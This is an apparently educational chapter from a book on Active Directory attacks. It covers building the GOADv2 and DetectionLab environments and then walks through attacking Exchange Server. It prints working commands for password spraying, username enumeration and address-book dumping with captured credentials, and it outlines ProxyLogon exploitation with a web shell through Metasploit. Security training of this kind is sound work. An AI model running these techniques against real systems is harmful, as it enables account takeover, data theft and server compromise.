<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer028">
<h1 class="chapter-number" id="_idParaDest-13"><a id="_idTextAnchor012"/>1</h1>
<h1 id="_idParaDest-14"><a id="_idTextAnchor013"/>Getting the Lab Ready and Attacking Exchange Server</h1>
<p>Windows Active Directory is the de facto standard in most enterprises to run and support Windows-based networks. While centralized management brings convenience, it also introduces security risks. When carrying out their operations, malicious actors plan to achieve certain goals, and compromising Active Directory can help them do so. Active Directory’s default configuration is far from being secure. The best way to learn about Active Directory security is to execute attacks in a safe environment, trying to detect and prevent unwanted <span class="No-Break">malicious activities.</span></p>
<p>Throughout the book, we will focus on the Active Directory kill chain, executing attacks and trying to detect as well as prevent them. This chapter will cover how to deploy a safe playground for such activities. We will use this lab throughout the book, later on adding extra <a id="_idIndexMarker000"/>services that will be covered in <a id="_idIndexMarker001"/>corresponding <a id="_idIndexMarker002"/>chapters about <strong class="bold">Active Directory Certificate Services</strong> (<strong class="bold">ADCS</strong>), SQL Server, and <strong class="bold">Windows Server Update Services</strong> (<strong class="bold">WSUS</strong>) together with <strong class="bold">System Center Configuration </strong><span class="No-Break"><strong class="bold">Manager</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">SCCM</strong></span><span class="No-Break">).</span></p>
<p>Our first practical target will be Microsoft Exchange Server. It is a complex collaboration product that is far more advanced than just an email server. From a security perspective, it is a valuable target because it is a mission-critical component of the infrastructure that is reachable from the internet. On-premises Exchange is closely tied together with Active Directory, often with <span class="No-Break">high privileges.</span></p>
<p>In this chapter, we are going to cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li>Lab architecture <span class="No-Break">and deployment</span></li>
<li>Active Directory <span class="No-Break">kill chain</span></li>
<li>Why initial access and host-related topics are <span class="No-Break">not covered</span></li>
<li>Attacking <span class="No-Break">Exchange Server</span></li>
</ul>
<h1 id="_idParaDest-15"><a id="_idTextAnchor014"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, 10 CPU cores, and at least 115 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based host OS is <span class="No-Break">strongly recommended</span></li>
<li>Vagrant installed with the plugin for the corresponding virtualization platform <span class="No-Break">and Ansible</span></li>
</ul>
<h1 id="_idParaDest-16"><a id="_idTextAnchor015"/>Lab architecture and deployment</h1>
<p>Even if creating and deploying a test lab can be daunting and time consuming, it is an important preparation step before jumping into attack emulation. MITRE ATT&amp;CK has a dedicated tactic <a id="_idIndexMarker003"/>for this activity called <span class="No-Break"><strong class="bold">Resource Development</strong></span><span class="No-Break">.</span></p>
<p>There are a few free but formidable projects available for automated lab deployment. You can choose <a id="_idIndexMarker004"/>any of them depending on your workstation’s resources and replicate the vulnerabilities yourself. For example, there is a very good open source project maintained by the Splunk Threat Research Team called Splunk Attack Range[1], where you can quickly deploy a small lab to perform attack simulations. However, I will use two other projects throughout <span class="No-Break">the book.</span></p>
<p>The first project I will <a id="_idIndexMarker005"/>use throughout the book is the GOADv2 lab created by Orange Cyberdefense[2]. To deploy it, you will need a Linux-based host OS with VMware Workstation or Oracle VirtualBox. It is also possible to deploy the lab on Proxmox, as shown by <em class="italic">Mayfly</em> in his blog[3]. Deployment is straightforward and well described in the <strong class="source-inline">README.md</strong> file in the repository. The entire process consists of two parts and will take around 3-4 hours depending on the speed of your internet connection. Vagrant will create virtual machines and Ansible playbooks will configure and deploy the necessary services, users, and vulnerabilities. To speed up the deployment process in the Vagrant file, we can change the <strong class="source-inline">box_version</strong> variable of all SRV server machines to the one that is already in the list, so only two images will be downloaded and used for further deployment. I will use VMware Workstation 16 installed on the most recent Arch Linux. After following the installation guide, the final message you’ll see should look like <span class="No-Break">the following:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer005">
<img alt="Figure 1.1 – Successful result of GOAD lab deployment" height="200" src="image/B18964_01_01.jpg" width="1169"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.1 – Successful result of GOAD lab deployment</p>
<p>The second repository that I will use in some chapters is the impressive DetectionLab project created by <em class="italic">Chris Long</em>[4]. Unfortunately, it is not maintained anymore, but it still perfectly fits our purposes. The advantage of this lab is that it provides us with a wide variety of deployment options, including cloud platforms and all modern bare-metal hypervisors. Moreover, this lab has detection tools installed for us (Sysmon, Velociraptor, Microsoft ATA, etc.). The installation is also straightforward. The preparation shell script will <a id="_idIndexMarker006"/>help identify missing software packages and Vagrant will <a id="_idIndexMarker007"/>do the rest. The overall process will take 1-2 hours depending on your network and computer. The following screenshot shows the successful execution of the pre-deployment script, meaning we are good to start <span class="No-Break">our DetectionLab:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer006">
<img alt="Figure 1.2 – The result of successful execution of prepare.sh" height="684" src="image/B18964_01_02.jpg" width="1340"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.2 – The result of successful execution of prepare.sh</p>
<p>The following diagram of the GOADv2 project was taken from the lab creator’s <span class="No-Break">GitHub repository:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer007">
<img alt="Figure 1.3 – GOADv2 overview" height="820" src="image/B18964_01_03.jpg" width="1650"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.3 – GOADv2 overview</p>
<p>This lab has two forests (<strong class="source-inline">sevenkingdoms.local</strong> and <strong class="source-inline">essos.local</strong>) with established trust and child-parent domains (<strong class="source-inline">sevenkingdoms.local</strong> and <strong class="source-inline">north.sevenkingdoms.local</strong>). Active Directory trust effectively allows to securely access a resource from <a id="_idIndexMarker008"/>the trusted domain by the trusting domain entity. Microsoft SQL <a id="_idIndexMarker009"/>Server will be deployed in both forests with a trusted link established between instances. We will also have <strong class="bold">Internet Information Services</strong> (<strong class="bold">IIS</strong>) installed <a id="_idIndexMarker010"/>on one of the servers. ADCS provides the required digital certificate infrastructure for the company to employ public key cryptography. These certificates can be used for various purposes, such as authentication, encryption, and signing documents and/or messages. There is a dedicated server for that role in our lab where we will be able to emulate attacks on ADCS. Most of the attack venues have already been introduced by the lab creator in the environment, but if we need to add or tweak something, it will be specifically mentioned, and step-by-step guidelines <a id="_idIndexMarker011"/>will be provided – for example, installing WebClient or deploying <strong class="bold">Group Managed Service </strong><span class="No-Break"><strong class="bold">Accounts</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">gMSAs</strong></span><span class="No-Break">).</span></p>
<p>The next section will cover common approaches for attacking any target, including <span class="No-Break">Active Directory.</span></p>
<h1 id="_idParaDest-17"><a id="_idTextAnchor016"/>Active Directory kill chain</h1>
<p>What is Active Directory? In plain words, it is a hierarchically structured storage of object information. One of the main benefits is that Active Directory allows centralized management and <a id="_idIndexMarker012"/>authentication. Now, let us briefly discuss what the Cyber Kill Chain is. This framework was developed by Lockheed Martin and has a military background. It is a concept that identifies the structure of an attack. We can adapt Cyber Kill Chain concepts for Active Directory as in the diagram from <em class="italic">infosecn1nja</em> on GitHub[5]. It has several steps, but it always follows the same cycle – <strong class="bold">recon</strong>, <strong class="bold">compromise</strong>, <strong class="bold">lateral movement</strong> – just with more <span class="No-Break">privileged access:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer008">
<img alt="Figure 1.4 – Active Directory kill chain" height="561" src="image/B18964_01_04.jpg" width="1650"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.4 – Active Directory kill chain</p>
<p>The focus of this book is Windows-based infrastructure and its services only, so themes such as local privilege escalation on the host, initial access, and external recon are out of the scope of this book. I will briefly explain the reasoning behind this decision in a dedicated section of this chapter. The following is a list of the themes that will be covered in the <span class="No-Break">corresponding chapters:</span></p>
<ul>
<li><span class="No-Break">Exchange Server</span></li>
<li><span class="No-Break">Defense evasion</span></li>
<li><span class="No-Break">Internal recon</span></li>
<li><span class="No-Break">Credential access</span></li>
<li><span class="No-Break">Lateral movement</span></li>
<li><span class="No-Break">Privilege escalation</span></li>
<li><span class="No-Break">Persistence</span></li>
<li><span class="No-Break">AD CS</span></li>
<li>Microsoft <span class="No-Break">SQL Server</span></li>
<li><span class="No-Break">WSUS</span></li>
<li><span class="No-Break">Microsoft SCCM</span></li>
</ul>
<p>In this book, we are focused on compromising the Active Directory environment and Windows-based common services, not red team operations. The reasoning is that red team operations often have business-related goals rather than finding and exploiting all possible vulnerabilities in Active Directory and services. It is important to mention that depending on the target environment, scope, and level of obtained privileges during initial access, it is not always necessary to compromise every target. For example, getting access to the financial data of the company does not require domain admin privileges, but in some cases, such privileges can be helpful. We will cover attack detection and possible prevention <a id="_idIndexMarker013"/>measures, as well as offensive <strong class="bold">Operational Security</strong> (<strong class="bold">OpSec</strong>). In plain words, it refers to how much of your activity can be spotted by an adversary. This is a double-edged sword, meaning it is applicable for both offensive and defensive actions and ways to deceive <span class="No-Break">the adversary.</span></p>
<h1 id="_idParaDest-18"><a id="_idTextAnchor017"/>Why we will not cover initial access and host-related topics</h1>
<p>Initial access is a vital, early-stage step to compromise the target environment. However, this will not be <a id="_idIndexMarker014"/>covered in this book for the following reasons. To be honest, this theme is as wide as it is deep. It requires cross-field knowledge from different areas of IT as well as psychology, so it would require a separate book itself. Also, there is a high chance that at the moment of such a book being published, half of the attack vectors will be killed by <a id="_idIndexMarker015"/>implementing security solutions, such as <strong class="bold">Endpoint Detection and Response</strong> (<strong class="bold">EDR</strong>), and/or covered by a blue team’s comprehensive detection capabilities. The reason is that it is rapidly developing, full of private research that isn’t published. In general, to obtain stable initial access to the target environment, there are three main topics to take care of – a resilient and secure attack infrastructure, covert tooling with the required capabilities, and successful <span class="No-Break">defense evasion.</span></p>
<p>To avoid any painful mistakes being made during manual deployment, using automation such as Terraform and Ansible can help to build a resilient attacker’s infrastructure. But it comes at the price of time investment and requirements for scripting and a sysadmin skillset. One of the best resources to start with such a topic is the wiki on GitHub[6]. Infrastructure needs to be properly designed with multiple redirectors for different protocols, secured and hardened, and categorized correctly if phishing and filtering proxies are a part of <span class="No-Break">the game.</span></p>
<p>Covert tooling, evasion techniques, and detections are a never-ending battle of establishing dominance between skillful blue teams, SOCs, and EDR/security vendors on one hand and offensive security researchers together with red teams on the other. A great note[7] by <em class="italic">Jordan Potti</em> about the red team’s efforts and ROI regarding the EDR fight is also one of the reasons why I do not cover this topic and only focus on Windows-based infrastructure and Active Directory. I do not believe it is possible to write an all-in-one comprehensive red team book covering every single topic <span class="No-Break">in depth.</span></p>
<p>As our book is focused on Active Directory security concepts, we will follow the <strong class="bold">assume breach</strong> approach. A great <a id="_idIndexMarker016"/>presentation was created by Red Siege in 2019 to explain this model[8]. In our case, we assume that we have compromised a standard domain user. All further steps will be happening in the context of this user. We also assume that our initial foothold is covert and not detected by EDR/antivirus or any other security product. However, all further activities, including network traffic and generated event logs, are considered to be monitored by the blue team. Later in the book, if some activities require certain privileges, they will be <span class="No-Break">specifically mentioned.</span></p>
<p>Our next section will finally be practical and more hands-on. We will discuss and replicate attacks against Exchange Server using <span class="No-Break">various scenarios.</span></p>
<h1 id="_idParaDest-19"><a id="_idTextAnchor018"/>Attacking Exchange Server</h1>
<p>Exchange Server is a collaboration server developed by Microsoft. Despite the fact that more and more companies are moving to the O365 cloud, there is still a good possibility that you will <a id="_idIndexMarker017"/>encounter on-premises deployment. Exchange has multiple useful features for end users, but it is also extremely difficult to develop all of them securely. In recent years, a lot of research has been published revealing critical vulnerabilities in its different components. Moreover, patches from Microsoft did not always completely fix these vulnerabilities, meaning that adversaries attempted to develop a one-day exploit by reverse engineering the patch and were able to find a suitable bypass. Considering that sometimes it is not possible for businesses to react in a timely manner to such rapidly changing situations, the chance of being compromised is <span class="No-Break">quite high.</span></p>
<p>But what is the benefit for an adversary to compromise Exchange? First of all, a successful takeover gives access to the mailboxes of every single user on this server. It can then evolve into an internal phishing campaign, sensitive data disclosure, and password harvesting in emails. Second, Exchange Service accounts may run with high privileges, including domain admin, making full domain <span class="No-Break">takeover possible.</span></p>
<p>To assess the security of Exchange Server, we can add Exchange Server to DetectionLab; however, you would need to deploy these at your end. To spin up Exchange Server, you simply run the following commands, assuming you are <span class="No-Break">using Linux:</span></p>
<pre class="console">
cd /opt/DetectionLab/Vagrant/Exchange
vagrant up exchange</pre> <p>If you encounter any problems during the deployment, you can find logs conveniently located in the <span class="No-Break"><strong class="source-inline">C:\exchange2016</strong></span><span class="No-Break"> folder:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer009">
<img alt="Figure 1.5 – Logs location for Exchange deployment" height="313" src="image/B18964_01_05.jpg" width="652"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.5 – Logs location for Exchange deployment</p>
<p>Exchange allows <a id="_idIndexMarker018"/>remote access via protocols such as <strong class="bold">Exchange Web Services</strong> (<strong class="bold">EWS</strong>), <strong class="bold">Exchange ActiveSync</strong> (<strong class="bold">EAS</strong>), Outlook Anywhere, and MAPI <a id="_idIndexMarker019"/>over HTTP. The AutoDiscover service helps to <a id="_idIndexMarker020"/>retrieve Exchange configuration, mailbox settings, supported protocols, and service URLs. You can find this information in the <strong class="source-inline">autodiscover.xml</strong> file in the <strong class="source-inline">autodiscover</strong> virtual directory. <strong class="bold">Outlook Web Application</strong> (<strong class="bold">OWA</strong>) is a minimal <a id="_idIndexMarker021"/>web-based email client. This client can be accessed with just a browser without Outlook being installed. <strong class="bold">Global Address List</strong> (<strong class="bold">GAL</strong>) is a list <a id="_idIndexMarker022"/>of every mail-enabled object in an Active Directory forest. Two more concepts we will cover are Outlook rules and forms. Rules are an action that is run automatically by Outlook for Windows on incoming/outgoing emails. We create the trigger and the action. Server-side rules are executed first, then client-side. Outlook forms provide users and/or organizations with email customization options, such as the autocompletion of some fields or <span class="No-Break">template text.</span></p>
<p>In this section, we will discuss tools and techniques for user enumeration and password spraying; email <a id="_idIndexMarker023"/>address extraction from GAL and <strong class="bold">Offline Address Book</strong> (<strong class="bold">OAB</strong>) or by using <strong class="bold">Name Service Provider Interface</strong> (<strong class="bold">NSPI</strong>); public <a id="_idIndexMarker024"/>point-and-click exploits; the exfiltration of sensitive data; and some techniques to get a foothold in the target environment through the client software. A great mind map for attacking Exchange on the perimeter was created by the same company that created the GOADv2 lab and is available <span class="No-Break">on GitHub[9].</span></p>
<p>Our first practical task is to enumerate users and try to obtain a valid set of credentials by performing a password <span class="No-Break">spray attack.</span></p>
<h2 id="_idParaDest-20"><a id="_idTextAnchor019"/>User enumeration and password spraying</h2>
<p>Password spray attacks require user enumeration. Firstly, we need to create a list with possible usernames <a id="_idIndexMarker025"/>and enumerate the Active Directory <a id="_idIndexMarker026"/>domain name. Secondly, we need to enumerate existing users via OWA and then perform a password spray attack. To perform these actions, we are going to use the <strong class="bold">MailSniper</strong> tool[10]. The first step can be <a id="_idIndexMarker027"/>done using <strong class="bold">Open Source Intelligence</strong> (<strong class="bold">OSINT</strong>) techniques by doing DNS reconnaissance, utilizing advanced search operators in search engines and scraping social media and the company’s external resources. There are plenty of open source tools available to perform these activities in different stages of their development life cycle. If there are email addresses published on external websites, attackers may be lucky to find an email address format such as <strong class="source-inline">surname.name@company.com</strong> or <strong class="source-inline">name.surname@company.com</strong>. Also, there is a site, <a href="https://hunter.io/">https://hunter.io/</a>, that can help with finding out the most common email format used in a company. If there are only general addresses such as info, security, GDPR, then we can try to use a script such as <strong class="source-inline">namemash</strong>[11] and/or <strong class="source-inline">EmailAddressMangler</strong>[12], which can create a list of all possible username permutations. After this step, the attacker will have a list of potential users that need to be validated. Now we need to find out the domain name with the help of the <strong class="source-inline">DomainHarvestOWA</strong> function from <strong class="source-inline">MailSniper</strong>. It has two options on how to obtain the correct domain name. One is to extract the name from the <strong class="source-inline">WWW-Authenticate</strong> header returned in the web response by the server after a request has been sent to <a href="https://mail.target.com/autodiscover/Autodiscover.xml">https://mail.target.com/autodiscover/Autodiscover.xml</a> and <a href="https://mail.target.com/EWS/Exchange.asmx">https://mail.target.com/EWS/Exchange.asmx</a>. The second option is to brute-force the name by using a supplied domain list. Requests will be sent to https://mail.target.com/owa/ and the response time will be calculated. A request with an invalid domain has a much shorter response time than a valid one. Apparently, the username does not influence the delay. Let us try this <span class="No-Break">reconnaissance activity:</span></p>
<pre class="console">
Invoke-DomainHarvestOWA -ExchHostname 192.168.56.106</pre> <p>The result <a id="_idIndexMarker028"/>of running the preceding command <a id="_idIndexMarker029"/>can be found in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer010">
<img alt="Figure 1.6 – Discovering the FQDN of the mail server" height="49" src="image/B18964_01_06.jpg" width="621"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.6 – Discovering the FQDN of the mail server</p>
<p>After determining the domain name, our next step is user enumeration. This is a purely time-based enumeration technique. <strong class="source-inline">MailSniper</strong> calculates the time difference between authentication attempt responses. When a valid username is found, the response time will be <span class="No-Break">significantly shorter:</span></p>
<pre class="console">
Invoke-UsernameHarvestOWA -UserList .\user.txt -ExchHostname 192.168.56.106 -Domain windomain.local -OutFile found.txt</pre> <p>The result of the enumeration can be found in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer011">
<img alt="Figure 1.7 – Successful user enumeration using OWA" height="695" src="image/B18964_01_07.jpg" width="787"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.7 – Successful user enumeration using OWA</p>
<p>We were <a id="_idIndexMarker030"/>able to find two users – <strong class="source-inline">Administrator</strong> and <strong class="source-inline">vinegrep</strong>. Now, let us perform a password spray attack against OWA. In this <a id="_idIndexMarker031"/>scenario, the tool will spray a single password against a supplied list <span class="No-Break">of usernames:</span></p>
<pre class="console">
Invoke-PasswordSprayOWA -ExchHostname 192.168.56.106 -UserList .\found.txt -Password Qwerty123! -OutFile creds.txt</pre> <p>We are able to successfully obtain a valid set of credentials for the <span class="No-Break">user </span><span class="No-Break"><strong class="source-inline">vinegrep</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer012">
<img alt="Figure 1.8 – Valid set of credentials found for user vinegrep" height="165" src="image/B18964_01_08.jpg" width="775"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.8 – Valid set of credentials found for user vinegrep</p>
<p>A password spray attack can be performed against EWS as well with <strong class="source-inline">MailSniper</strong>’s <strong class="source-inline">Invoke-PasswordSprayEWS</strong> function. It is important to note that the obtained set of valid credentials <a id="_idIndexMarker032"/>will not grant access if <strong class="bold">Multi-Factor Authentication</strong> (<strong class="bold">MFA</strong>) is enforced. MFA will require another factor, which can <a id="_idIndexMarker033"/>be anything starting from an authentication <a id="_idIndexMarker034"/>application on a phone to a USB security token or another type of secret. Like any security measure, MFA can be bypassed if it is misconfigured or an adversary lures the user to perform the second step of authentication instead <span class="No-Break">of them.</span></p>
<p>The next step is to get the most out of this valid set of credentials and access to a mailbox. In the following section, we will learn how to dump an address book and exfiltrate <span class="No-Break">sensitive data.</span></p>
<h2 id="_idParaDest-21"><a id="_idTextAnchor020"/>Dumping and exfiltrating</h2>
<p>Assuming MFA has been bypassed or not enforced and an adversary has successfully logged in to <a id="_idIndexMarker035"/>the victim’s mailbox, what are the next steps? There are a few available scenarios. Firstly, the attacker can go through emails; maybe some <a id="_idIndexMarker036"/>sensitive internal information, including passwords, certificates, documents, and endpoint addresses, can be found. As a security professional, before doing so, ensure that it is in line with the rules of engagement. The last thing you want to do is get unauthorized access to the customer’s <span class="No-Break">confidential data.</span></p>
<p>Secondly, run an internal phishing campaign. Internal email processing rules may be more relaxed from a security point of view – for example, attachments being allowed. Also, such a campaign has a much higher success rate as users will be more likely to open an attachment/click a link from a colleague or manager. But it is still not a guarantee as we do not have control over non-email mediums. We can send an email to the victim’s colleague while they are discussing something in real life. However, there is a moral aspect to consider as well. Depending on the targeted company’s culture and rules, the user may lose <span class="No-Break">their job.</span></p>
<p>Thirdly, we can extract all the email addresses of the company and some information about Active Directory without disclosing any mailbox content. It is possible by dumping GAL or OAB or by abusing NSPI. Let us extract GAL via a compromised account using <strong class="source-inline">MailSniper</strong>. This module connects to OWA and utilizes the <strong class="source-inline">FindPeople</strong> method to collect email addresses. This method is available from Exchange 2013 and requires the <strong class="source-inline">AddressListId</strong> value from the <span class="No-Break"><strong class="source-inline">GetPeopleFilters</strong></span><span class="No-Break"> URL:</span></p>
<pre class="console">
Get-GlobalAddressList -ExchHostname 192.168.56.106 -UserName windomain.local\vinegrep -Password Qwerty123! -OutFile gal.txt</pre> <p>Successful GAL extraction can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer013">
<img alt="" height="259" role="presentation" src="image/B18964_01_09.jpg" width="1192"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.9 – GAL extraction</p>
<p>With newly <a id="_idIndexMarker037"/>found email addresses, we can relaunch our password <span class="No-Break">spray attack.</span></p>
<p>Another way <a id="_idIndexMarker038"/>to dump the email addresses of all Exchange users is by downloading OAB files. An important caveat is that extracting the primary email address of an existing user is required as well as any valid domain account. The steps are <span class="No-Break">as follows:</span></p>
<ol>
<li>Issue the web request to the <strong class="source-inline">autodiscover</strong> endpoint to <span class="No-Break">retrieve </span><span class="No-Break"><strong class="source-inline">autodiscover.xml</strong></span><span class="No-Break">.</span></li>
<li>Search for the <strong class="source-inline">OABUrl</strong> value in the response, which is a path to the directory with OAB files. Do not miss other useful information, such as the domain user’s SID and domain <span class="No-Break">controller name.</span></li>
<li>Request <strong class="source-inline">oab.xml</strong> by using the <strong class="source-inline">OABUrl</strong> value to list <span class="No-Break">OAB filenames.</span></li>
<li>In <strong class="source-inline">oab.xml</strong>, search for a filename that includes <strong class="source-inline">data</strong> and has the <strong class="source-inline">.</strong><span class="No-Break"><strong class="source-inline">lzx</strong></span><span class="No-Break"> extension.</span></li>
<li>Download this file and <span class="No-Break">parse it.</span></li>
</ol>
<p>We will need a Linux machine to run the following commands. To automate OABUrl extraction, we will use the script from GitHub[13]. The script helps with steps 1 and 2. The result can be found in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer014">
<img alt="Figure 1.10 – OABUrl extraction" height="172" src="image/B18964_01_10.jpg" width="1215"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.10 – OABUrl extraction</p>
<p>Next, we will <a id="_idIndexMarker039"/>copy the <strong class="source-inline">oab.xml</strong> file and parse it to find the <a id="_idIndexMarker040"/>URL for the <strong class="source-inline">.lzx</strong> file with the word <strong class="source-inline">data</strong> in the filename. This is our GAL OAB file. As a last step, we will save the file and parse through it to find <span class="No-Break">email addresses:</span></p>
<pre class="console">
curl -k --ntlm -u 'windomain.local\vinegrep:Qwerty123!' https://exchange.windomain.local/OAB/e79472bb-2dd6-4ffb-9e02-8dd42510bb1b/oab.xml &gt; oab.xml
cat oab.xml | grep '.lzx' | grep data
curl -k --ntlm -u 'windomain.local\vinegrep:Qwerty123!' https://exchange.windomain.local/OAB/e79472bb-2dd6-4ffb-9e02-8dd42510bb1b/007215f1-4ab8-4ed2-a503-4cd82b0d8093-data-1.lzx &gt; oab.lzx
strings oab.txt | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,5}" | sort -u</pre> <p>GAL emails from OAB can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer015">
<img alt="Figure 1.11 – GAL email extraction using OAB" height="450" src="image/B18964_01_11.jpg" width="1549"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.11 – GAL email extraction using OAB</p>
<p>Another way to dump an address book via NSPI was discovered by <em class="italic">Positive Technologies</em> in their research[14]. A tool <a id="_idIndexMarker041"/>named <strong class="bold">Exchanger</strong> is now a part of Impacket, so we can use it without any additional installation. As a first step, we list tables to get the GUID and then, using the GUID, dump <span class="No-Break">promising tables:</span></p>
<pre class="console">
python3 exchanger.py windomain.local/vinegrep:'Qwerty123!'@exchange.windomain.local -debug nspi list-tables -count
python3 exchanger.py windomain.local/vinegrep:'Qwerty123!'@exchange.windomain.local -debug nspi dump-tables -guid 715d9794-704c-4fe3-a038-24f149747b2c -lookup-type EXTENDED</pre> <p>The result <a id="_idIndexMarker042"/>of the dump can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer016">
<img alt="Figure 1.12 – Dumping an address book by its GUID via NSPI" height="328" src="image/B18964_01_12.jpg" width="1582"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.12 – Dumping an address book by its GUID via NSPI</p>
<p>Now, we can <a id="_idIndexMarker043"/>relaunch our password spray attack using extracted emails. We can also use this tool to dump Active Directory objects by their GUIDs. Please note that first we need to obtain the GUID, for example, with a PowerShell command, and only then pass it <span class="No-Break">to Exchanger:</span></p>
<pre class="console">
Get-ADComputer -Identity win10.ObjectGUID
python3 exchanger.py windomain.local/vinegrep:'Qwerty123!'@exchange.windomain.local -debug nspi guid-known -guid b1422ca3-66c7-4d6b-b7f4-43c73e9705b2 -lookup-type EXTENDED</pre> <p>The result of the Exchanger command execution can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer017">
<img alt="Figure 1.13 – Dumping an Active Directory object by its GUID via NSPI" height="334" src="image/B18964_01_13.jpg" width="1587"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.13 – Dumping an Active Directory object by its GUID via NSPI</p>
<p>On the topic of data exfiltration, we cannot refrain from mentioning a project called <strong class="bold">PEAS</strong>[15]. This tool was developed based on MWR research[16] to run commands on an ActiveSync server. The idea is that we can enumerate and access file shares in the domain through <a id="_idIndexMarker044"/>Exchange Server. The main cons of this tool are that <a id="_idIndexMarker045"/>the ActiveSync protocol must be enabled on the server and for the client’s account. Also, ActiveSync should be configured in a way that allows UNC paths and doesn’t limit <span class="No-Break">SMB servers.</span></p>
<p>Another way to remotely compromise Exchange is through exploitable vulnerabilities. In recent years, quite a few critical vulnerabilities have been found and disclosed. In the next section, we will cover available <span class="No-Break">public exploits.</span></p>
<h2 id="_idParaDest-22"><a id="_idTextAnchor021"/>Zero2Hero exploits</h2>
<p>In this <a id="_idIndexMarker046"/>section, we will <a id="_idIndexMarker047"/>discuss the <strong class="source-inline">Proxy* </strong>exploit family, CVE-2020-0688, and <strong class="bold">PrivExchange</strong> (CVE-2018-8581). All of them have different root causes, but they <a id="_idIndexMarker048"/>all prove that Exchange is an extremely complex piece of software with a wide <span class="No-Break">attack surface.</span></p>
<p>We will start with the <strong class="source-inline">Proxy*</strong> exploit family. This class of vulnerabilities appeared when adversaries <a id="_idIndexMarker049"/>and researchers changed focus to a new attack surface – <strong class="bold">Client Access Service</strong> (<strong class="bold">CAS</strong>). We will start with the most famous vulnerability in <a id="_idIndexMarker050"/>Exchange history – <strong class="bold">ProxyLogon</strong>[17]. <em class="italic">Orange Tsai</em> from DEVCORE discovered two vulnerabilities (CVE-2021-26855 and CVE-2021-27065), which in combination allow bypassing authentication and achieving remote <span class="No-Break">code execution.</span></p>
<p>CVE-2021-26855 <a id="_idIndexMarker051"/>is a <strong class="bold">Server-Side Request Forgery</strong> (<strong class="bold">SSRF</strong>) that allows bypassing authentication and sending requests with the highest privileges. When a user sends a request to the Exchange frontend, it will flow through the HTTP proxy module, which will then evaluate it and send it to the backend. It is possible to forge a server-side request by setting the X-BEResource cookie value to the desired backend URL. There are two scenarios to exploit this vulnerability. The first scenario is to access emails, but it requires at least two Exchange servers in the target environment. Another one <a id="_idIndexMarker052"/>is to authenticate to <strong class="bold">Exchange Control Panel</strong> (<strong class="bold">ECP</strong>) and then upload the web shell (CVE-2021-27065 and CVE-2021-26858). An excellent manual with step-by-step instructions and detections was published <span class="No-Break">by </span><span class="No-Break"><em class="italic">BI.ZONE</em></span><span class="No-Break">[18].</span></p>
<p>CVE-2021-27065 is a post-authentication <a id="_idIndexMarker053"/>arbitrary file write. In a nutshell, the attacker logs in to ECP and <a id="_idIndexMarker054"/>then, in the OAB virtual directory, edits the <strong class="source-inline">External URL</strong> field by inserting web shell code and requests a reset of the directory in order to save the <span class="No-Break">web shell.</span></p>
<p>To check whether Exchange is vulnerable, we can utilize a module from Metasploit – <strong class="source-inline">auxiliary/scanner/http/exchange_proxylogon</strong>. The result of the scan is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer018">
<img alt="Figure 1.14 – Exchange is vulnerable to a ProxyLogon vulnerability" height="80" src="image/B18964_01_14.jpg" width="615"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.14 – Exchange is vulnerable to a ProxyLogon vulnerability</p>
<p>For reliable exploitation, we can use a Metasploit exploit – <strong class="source-inline">exploit/windows/http/exchange_proxylogon_rce</strong>. All we need is one valid email address and that is it. The result of the exploitation can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer019">
<img alt="Figure 1.15 – Exploitation of the ProxyLogon vulnerability" height="520" src="image/B18964_01_15.jpg" width="1128"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.15 – Exploitation of the ProxyLogon vulnerability</p>
